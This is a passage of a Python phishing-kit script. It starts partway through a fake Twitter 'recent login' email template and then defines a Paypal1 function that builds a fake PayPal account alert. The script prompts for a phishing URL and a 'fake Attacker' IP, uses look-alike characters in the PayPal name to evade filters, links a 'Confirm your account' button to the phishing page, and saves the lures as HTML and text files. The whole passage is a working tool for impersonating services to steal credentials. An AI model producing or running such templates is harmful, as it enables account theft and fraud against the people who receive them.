class="m_7210276772504823937logo_space"> &nbsp; </td></tr><tr align="right"><td width="24" class="m_7210276772504823937margin" style="padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="right" style="padding:0;margin:0;line-height:1px;font-size:1px"> <a href="#m_7210276772504823937_" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0"> <img width="32" align="right" src="https://ci6.googleusercontent.com/proxy/7uJiuTOo6rMk0ahEnEhjXzhKVdtkt-IgM_uCWBYJd8SjMK2uFYPnfc9tFTdYP-OAHBQWBjjS-gNGUpaW67od9X37iuyFD32VfvDGDyXB1DDj-o0HyZXQdxkFn8uPO3ydU9rPwA=s0-d-e1-ft#https://ea.twimg.com/email/self_serve/media/Twitter_logo_180-1468901451975.png" style="width:32px;margin:0;padding:0;display:block;border:none;outline:none" class="CToWUd"> </a> </td><td width="24" class="m_7210276772504823937margin" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td colspan="4" height="24" style="height:24px;padding:0;margin:0;line-height:1px;font-size:1px" class="m_7210276772504823937logo_space"> <img width="1" height="1" style="display:block;margin:0;padding:0;display:block;border:none;outline:none" src="https://ci6.googleusercontent.com/proxy/DcPlfaEWAKqTloO57NjmsI2d7aQm9ZJE7V1xVBepiu2RDkg2ScBv6cld0fmGgPGWqlUp2IghtFNnNIr7ap2zdki9k3RW8ftVByQdeahXNIPYHI4WNspFWCV3oCaqQlH8XsU7lG9hTHrZwYJZ_LgibzX_SE10SkLb7KMvaZDd-zrTpRqBQTwZKEa8ZknEgYHIZdakbg=s0-d-e1-ft#https://twitter.com/scribe/ibis?t=1&amp;cn=bG9naW5fbm90aWZpY2F0aW9u&amp;iid=d245d496e25743259b05c4aeaf0b44cf&amp;uid=2356568077&amp;nid=244+20" class="CToWUd"> </td></tr></tbody></table><table class="m_7210276772504823937collapse" id="m_7210276772504823937header" align="center" width="448" style="width:448px;background-color:#ffffff;padding:0;margin:0;line-height:1px;font-size:1px" bgcolor="#ffffff" cellpadding="0" cellspacing="0" border="0"><tbody><tr align="left;"><td width="24" class="m_7210276772504823937margin" style="padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="left;" style="padding:0;margin:0;line-height:1px;font-size:1px"><table class="m_7210276772504823937collapse" cellpadding="0" cellspacing="0" border="0" style="padding:0;margin:0;line-height:1px;font-size:1px"><tbody><tr><td align="left;" class="m_7210276772504823937h2" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:24px;line-height:32px;font-weight:bold;color:#292f33;text-align:left;text-decoration:none"> We noticed a recent login for your account <a href="" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;color:#292f33;text-decoration:none" target="_blank">{}</a>. </td></tr><tr><td height="24" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td style="padding:0;margin:0;line-height:1px;font-size:1px"><table width="100%" align="center" cellspacing="0" border="0" class="m_7210276772504823937collapse" style="padding:0;margin:0;line-height:1px;font-size:1px"><tbody><tr><td width="30" style="width:30px;padding:0;margin:0;line-height:1px;font-size:1px" class="m_7210276772504823937margins"></td><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table width="100%" align="center" cellpadding="0" cellspacing="0" border="0" class="m_7210276772504823937collapse" style="padding:0;margin:0;line-height:1px;font-size:1px"><tbody><tr><td align="left" width="25%" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"><strong>Device</strong></td><td width="15" style="width:15px;padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="left" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none">Chrome on Android</td></tr><tr><td align="left" width="25%" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"><strong>Location</strong></td><td width="15" style="width:15px;padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="left" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none">Near {}, {}</td></tr></tbody></table> </td></tr></tbody></table> </td></tr><tr><td height="24" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="left" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> <strong>If this was you:</strong> </td></tr><tr><td height="6" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="left" class="m_7210276772504823937body-text" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> Great! There's nothing else you need to do. </td></tr><tr><td height="24" style="height:24px;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="left;" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> <strong>If this wasn’t you:</strong> </td></tr><tr><td height="6" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="left;" class="m_7210276772504823937body-text" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> Your account may have been compromised and you should take a few steps to make sure your account is secure. To start, <a href="{}" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;border:none;text-decoration:none;font-weight:400;color:#1da1f2" target="_blank">reset your password now</a>. </td></tr><tr><td height="36" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr></tbody></table> </td><td width="24" class="m_7210276772504823937margin" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table width="100%" align="center" cellpadding="0" cellspacing="0" border="0" class="m_7210276772504823937edu-module" style="padding:0;margin:0;line-height:1px;font-size:1px;background-color:#ffffff;border-radius:5px"><tbody><tr><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr></tbody></table> </td><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td colspan="3" height="24" class="m_7210276772504823937edu-space" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td width="24" class="m_7210276772504823937edu-margins" style="padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table width="100%" align="center" cellpadding="0" cellspacing="0" border="0" class="m_7210276772504823937edu-module" bgcolor="#F5F8FA" style="padding:0;margin:0;line-height:1px;font-size:1px;background-color:#ffffff;border-radius:5px"><tbody><tr><td align="left" style="padding:0;margin:0;line-height:1px;font-size:1px"><table border="0" cellpadding="0" cellspacing="0" width="100%" style="padding:0;margin:0;line-height:1px;font-size:1px"><tbody><tr><td class="m_7210276772504823937edu-header" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-size:16px;line-height:22px;text-align:left;color:#8899a6"> <strong>How do I know an email is from <span class="il">Twitter</span>?</strong> </td></tr><tr><td colspan="3" height="12" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td class="m_7210276772504823937edu-text" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:19px;font-weight:400;text-align:left;color:#8899a6"> Links in this email will start with “<span class="m_7210276772504823937no-link"><a href="#m_7210276772504823937_" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;color:#8899a6;text-decoration:none">https://</a></span>” and contain “<span class="m_7210276772504823937no-link"><a href="{}" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;color:#8899a6;text-decoration:none" target="_blank" data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=https://twitter.com/i/redirect?url%3Dhttps%253A%252F%252Ftwitter.com%252F%253Frefsrc%253Demail%26t%3D1%26cn%3DbG9naW5fbm90aWZpY2F0aW9u%26sig%3D5810b2be86b6d2764512337d9cf3ea4d02812789%26iid%3Dd245d496e25743259b05c4aeaf0b44cf%26uid%3D2356568077%26nid%3D244%2B1554&amp;source=gmail&amp;ust=1488768499007000&amp;usg=AFQjCNFX5GJTsk-lhQbDIpjXZSXB0zgDlQ"><span class="il">{}</span>{}</a></span>.” Your browser will also display a padlock icon to let you know a site is secure. </td></tr></tbody></table> </td></tr></tbody></table> </td><td width="24" class="m_7210276772504823937edu-margins" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td colspan="3" height="24" class="m_7210276772504823937edu-space" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table width="100%" align="center" cellpadding="0" cellspacing="0" border="0" class="m_7210276772504823937edu-module" style="padding:0;margin:0;line-height:1px;font-size:1px;background-color:#ffffff;border-radius:5px"><tbody><tr><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr></tbody></table> </td><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr></tbody></table><table class="m_7210276772504823937collapse" id="m_7210276772504823937footer" align="center" width="448" style="width:448px;background-color:#ffffff;padding:0;margin:0;line-height:1px;font-size:1px" cellpadding="0" cellspacing="0" border="0"><tbody><tr><td height="36" style="height:36px;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"> <span class="m_7210276772504823937small-copy" style="font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none"> <a href="https://support.twitter.com/articles/76036" class="m_7210276772504823937small-copy" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:600;color:#1da1f2;text-align:left;text-decoration:none" target="_blank" data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=https://support.twitter.com/articles/76036&amp;source=gmail&amp;ust=1488768499007000&amp;usg=AFQjCNHUCzbUjXfmNAT0B7wamPYK6mFWjQ">Help</a> &nbsp;|&nbsp; <a href="https://twitter.com/i/redirect?url=https%3A%2F%2Fsupport.twitter.com%2Farticles%2F204820-fake-twitter-emails&amp;t=1&amp;cn=bG9naW5fbm90aWZpY2F0aW9u&amp;sig=ee6d8d5439b23c101a3694be6e6989a2ffa94c79&amp;iid=d245d496e25743259b05c4aeaf0b44cf&amp;uid=2356568077&amp;nid=244+1558" class="m_7210276772504823937small-copy" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:600;color:#1da1f2;text-align:left;text-decoration:none" target="_blank" data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=https://twitter.com/i/redirect?url%3Dhttps%253A%252F%252Fsupport.twitter.com%252Farticles%252F204820-fake-twitter-emails%26t%3D1%26cn%3DbG9naW5fbm90aWZpY2F0aW9u%26sig%3Dee6d8d5439b23c101a3694be6e6989a2ffa94c79%26iid%3Dd245d496e25743259b05c4aeaf0b44cf%26uid%3D2356568077%26nid%3D244%2B1558&amp;source=gmail&amp;ust=1488768499007000&amp;usg=AFQjCNHriReOKYKBFgrb1BXxDnBgMcj2aA">Email security tips</a> </span> </td></tr><tr><td height="12" style="height:12px;line-height:1px;font-size:1px;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"> <span class="m_7210276772504823937small-copy" style="font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none"> This email was meant for {}</span> </td></tr><tr><td height="6" style="height:6px;line-height:1px;font-size:1px;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"> <span class="m_7210276772504823937address"> <a href="#m_7210276772504823937_" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;color:#8899a6;font-size:12px;padding:0px;margin:0px;font-weight:normal;line-height:12px"><span class="il">Twitter</span>, Inc. 1355 Market Street, Suite 900 San Francisco, CA 94103</a> </span> </td></tr><tr><td height="72" style="height:72px;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr></tbody></table> </td></tr></tbody></table><div class="yj6qo"></div><div class="adL"></div></div>""".format(AccountName, City, Country, PhishUrl, PhishUrl, MustContain, Extension, TargetName))
	
	
	filename = input(start + " Enter Name On HTML File: ")
	TXTname = input(start + " Enter Name On Text file (.txt): ")
	Html_file = open(filename + ".html","w")
	Html_file.write(twitter)
	Html_file.close()
	print(alert + " HTML File Created")
	TXT_file = open(TXTname + ".txt","w")
	TXT_file.write(twitter)
	TXT_file.close()
	print(alert + " TXT file Created")

def Paypal1():
	Country = input(start + "Enter Country: ")
	IP = input(start + "Enter IP From fake Attacker: ")
	PhishUrl = input(start + "Enter Phishing Url: ")
	
	letter1 = ("""
		<html><head>

			<title></title>

	</head>

	<body>

	<div class="adL">

	<table align="center" bgcolor="#f9f9f9" border="0" cellpadding="0" cellspacing="0" class="m_8991478119753596533ecxinnermain" style="table-layout: fixed;" width="440">

			<tbody>

					<tr>

							<td colspan="4">

							<table bgcolor="#ffffff" border="0" cellpadding="0" cellspacing="0" style="border-style: solid; border-color: rgb(239, 239, 239);" width="100%">

									<tbody>

											<tr style="color: rgb(102, 102, 102); line-height: 20px; font-family: Arial, Helvetica, sans-serif; font-size: 14px;">

													<td align="center" class="m_8991478119753596533ecxcontent" colspan="2" style="padding-right: 40px; padding-left: 40px;" valign="top">

													<table bgcolor="#ffffff" border="0" cellpadding="0" cellspacing="0" width="100%">

															<tbody>

																	<tr>

																			<td align="left">

																			<p><h1 class="size-34" lang="x-size-34" style="Margin-top: 0;Margin-bottom: 0;font-style: normal;font-weight: normal;color: #3e4751;font-size: 30px;line-height: 38px;font-family: Century Gothic, sans-serif;text-align: left;"><span class="font-lato" style="line-height: inherit;"><span style="color: #024087;font-style: italic;font-weight: bold;line-height: inherit;">Ρаy</span><span style="color: #167cf0;font-style: italic;font-weight: bold;line-height: inherit;">Ρаl</span></span></h1></p>



																			<p><span style="color: rgb(72, 84, 93); line-height: 24px;">An unknown device trying to access to your account :&nbsp;</span></p>

																			</td>

																	</tr>

																	<tr>

																			<td height="20">&nbsp;</td>

																	</tr>

																	<tr>

																			<td align="left" style="color: rgb(72, 84, 93); line-height: 24px; font-weight: bold;">

																			<ul style="list-style: none; padding-left: 0px;">

																					<li>Location : {}</li>

																					<li>IP adress : {}</li>

																					<li>Navigator : Chrome (Windows)</li>

																			</ul>

																			</td>

																	</tr>

																	<tr>

																			<td height="20">&nbsp;</td>

																	</tr>

																	<tr>

																			<td align="left">

																			<p style="color: rgb(72, 84, 93); line-height: 24px;">Please confirm your information for security measures : </p>

																			</td>

																	</tr>

																	<tr>

															
																			<td align="center">
	<table height="40" cellpadding="2" cellspacing="2" style="text-align: left; width: 100%;position:relative;top:10px;">
	  <tbody>
					<tr>

								<td class="button_style" id="button_text" align="center" valign="middle" style="font-family:Helvetica,Arial,sans-serif; font-weight:bold; font-stretch:normal; text-align:center; color:#ffffff; font-size:13px;background:#009CDE; border-radius:7px !important; -webkit-border-radius: 7px !important; -moz-border-radius: 7px !important; -o-border-radius: 7px !important; -ms-border-radius: 7px !important;"><a href="{}" style="color:#ffffff; text-decoration:none; display:block; font-weight:bold;" class=""><span style="color:#ffffff; text-decoration:none; display:block; font-family:Helvetica,Arial,sans-serif; font-weight:bold; font-size:13px; line-height:15px;">Confirm your account</span></a></td>

					</tr>


				  </tbody>
			  </table>



	</td>



																	</tr>

																	<tr>

																			<td height="20">&nbsp;</td>

																	</tr>

																	<tr>

																			<td align="center">&nbsp;</td>

																	</tr>

															</tbody>

													</table>

													</td>

											</tr>

											

									</tbody>

							</table>



							

							</td>

					</tr>

			</tbody>

	</table>

	</div>



	</body></html> """.format(Country, IP, PhishUrl))

	filename = input(start + "Enter Name On HTML File: ")
	TXTname = input(start + "Enter Name On Text file (.txt): ")
	Html_file = open(filename + ".html","w")
	Html_file.write(letter1)
	Html_file.close()
	print(alert + " HTML File Created")
	TXT_file = open(TXTname + ".txt","w")
	TXT_file.write(letter1)
	TXT_file.close()
	print(alert + " TXT file Created")
	
